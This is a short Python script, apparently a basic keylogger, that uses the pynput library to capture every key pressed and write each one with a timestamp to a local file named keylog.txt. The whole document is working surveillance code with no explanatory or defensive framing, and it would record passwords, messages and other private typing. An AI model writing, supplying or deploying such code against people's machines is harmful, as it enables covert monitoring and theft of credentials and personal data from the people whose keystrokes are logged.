import logging
from pynput import keyboard

# Set up logging to log the keystrokes to a file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
